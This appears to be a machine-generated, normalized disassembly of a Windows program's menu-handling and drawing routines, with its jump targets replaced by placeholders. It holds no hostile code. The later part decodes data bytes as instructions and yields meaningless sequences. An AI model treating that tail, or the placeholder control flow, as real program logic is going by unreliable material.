mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_461210
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_461470
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_460b7c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_4609f8
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4609f8
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408760
mov eax [ ebp + 0x10 ]
call sub_4086a4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_46153c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_44a018
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_461518
mov [ ebx + 0x41 ] 0x1
sub_461564
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403340
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_461518
mov [ ebx + 0x41 ] 0x1
sub_4615f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4610ec
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_460f74
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_461680
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_4616bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4616e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461708
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_461c3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461c42
lea eax [ ebp - 0x30 ]
call sub_403f20
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov edx [ esi + 0x4 ]
call sub_460ab4
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_46dab8
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov dx [ esi + 0x4 ]
call sub_460a98
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_461a6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_461a51
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_424a8c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42492c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_461ee0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461a58
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424a8c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_4612f8
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_4609f8
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_4609f8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_461bb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_461b8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_461b6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_424a8c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42492c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461b76
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_424a8c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_44a29c
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46dab8
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_4609f8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_4609f8
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_4609f8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_460a28
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_418470
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_460a28
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_46d75c
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_46d7c4
jmp r-xdata
sub_461b93
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_461c4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_418314
pop esi
pop ebx
retn
push ebx
push sub_4616bc
call sub_4218a0
mov [ ebx + 0x10 ] eax
sub_461c90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_460810
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_461c4c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_461d04
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_461c74
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4608ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_461d5c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_45cba8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_461518
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_461518
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_461da4
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_45cba8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c308
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_40338c
mov edx eax
jmp r-xdata
sub_461df0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_416e0c
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_461d5c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_460164
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_460660
mov eax [ ebx + 0x34 ]
call sub_45da08
mov eax ebx
call sub_461008
mov eax ebx
call sub_461da4
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_45db38
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_461ea4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418470
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418470
cmp ebp [ eax ]
jne r-xdata
sub_461ee0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_42420c
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_423a40
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_42420c
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_423a40
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_40338c
mov edx [ r-xdata ]
call sub_40331c
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_42420c
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_423a40
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_461fc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403f74
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4041e0
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404480
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4041e0
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404480
jmp r-xdata
sub_46205c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f20
mov ebx 0x1
mov eax esi
call sub_4041e0
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404108
sub_4620c0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462119
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_461fc8
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_461fc8
mov eax [ ebp - 0x8 ]
pop edx
call sub_407f1c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462120
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
sub_46212d
insd
inc edi
add al dh
aad 0x47
add ah ch
insd
inc edi
add [ eax - 0x17ffb82b ] dh
insd
inc edi
add [ eax - 0x2b ] bl
inc edi
add ah ah
insd
inc edi
add [ ebp + edx * 8 + 0x6de00047 ] cl
inc edi
add [ eax + ebx * 8 + 0x47 ] bh
add ah bl
insd
inc edi
add [ ebp + edx * 8 + 0x6dd80047 ] dl
inc edi
add [ edi + edx * 8 ] dl
inc edi
add ah dl
insd
inc edi
add [ esi + edx * 8 + 0x6dd00047 ] al
inc edi
add [ eax ] bl
fld [ edi ]
int3
sub_462484
clc
dec esi
inc esi
add [ edi + ecx * 2 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
push ebx
insd
outsd
outsd
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
[ esi + ecx * 2 + 0x46 ]
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
mov esp 0xa0004651
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x25 ] ch
inc esi
add [ eax ] cl
ja r-xdata
inc ebp
inc ebp
add al cl
dec esi
outsd
jb r-xdata
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ eax - 0x37ffbabb ] ah
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
pop esp
mov [ eax + eax + 0x7c ] 0xfa
inc esp
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ ecx + edx * 2 + 0x46 ] al
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
sbb [ edi + 0x46 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ ebp + 0x46 ] ch
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
sar ah 0x25
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
daa
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc esi
add dh dh
inc esi
add [ edx + eax ] bl
add [ eax ] al
sbb [ edi + 0xec40044 ] cl
inc edx
sub_462652
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_462bd8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x2d
inc esi
add [ eax + 0x462e ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
sub eax 0x2ea60046
inc esi
add al bh
add al [ eax ]
add [ eax - 0x3bffb9db ] dh
push cs
inc edx
add [ eax ] al
pop ebx
inc esi
add [ esp + ebx * 2 + 0x33ec0046 ] dh
inc eax
add [ eax ] ah
add [ esi ] sub_403128
inc esp
xor [ eax ] eax
sbb al 0x5d
inc esi
add [ eax - 0x73ffbabb ] ah
bound eax [ esi ]
test [ edx + 0x5edc0041 ] cl
inc esi
add [ eax ] bl
pop edi
inc esi
add [ eax ] ah
inc esi
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add [ eax + ebp * 2 + 0xbbc0046 ] bl
inc edx
add [ esp ] bh
inc esi
add [ ecx + ebx * 2 + 0x46 ] dh
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
jl r-xdata
add ah bl
add [ esi ] 0x24
push cs
inc ebp
add [ edx + edi - 0x782fffbb ] bl
inc esi
add [ eax + 0x1800454c ] dl
aaa
inc ebp
add ah ah
pushfd
inc esi
add [ eax + 0x52 ] ch
inc esi
add [ eax ] bl
push ebp
inc esi
add ah al
lea eax [ esi ]
add [ esi + 0x46 ] bl
add [ esi + ebx * 2 + 0x46 ] bh
add ah al
mov al [ 0x5b380046 ]
inc esi
add [ eax + 0x38 ] ch
inc ebp
add [ eax ] bl
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x70 ]
inc si
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax + ebp * 2 + 0x46 ] ah
add [ eax ] dh
inc esi
add [ eax ] ah
rol [ eax + eax - 0x24 ] cl
push 0xf4c80046
inc esp
add [ eax + edi + 0x39780045 ] bh
inc ebp
add [ esp + esi + 0x45 ] dh
add [ ecx + edi + 0x45 ] bl
add [ eax + ebx * 2 + 0x46 ] dh
add [ eax + 0x2800466f ] al
cmovne eax [ eax ]
inc esp
jl r-xdata
inc esi
add al cl
fwait
inc esi
add [ eax + 0x7c004682 ] ch
popfd
inc esi
add [ eax + 0x68 ] ah
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
sbb [ eax ] ch
inc esi
add [ eax + 0x2 ] dl
add [ eax ] al
dec esp
sub [ esi ] al
add al [ fs : eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
pop ebx
add [ edi + edi * 2 + 0x7e600046 ] ah
inc esi
add al al
cmovne eax [ eax ]
les ecx [ edi ]
inc ebp
sub_462edc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x30
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
xor [ esi ] al
clc
add al [ eax ]
add ah dl
sub eax [ esi ]
les ecx [ esi ]
inc edx
add [ eax ] al
pop ebx
inc esi
add [ esp + ebx * 2 + 0x33ec0046 ] dh
inc eax
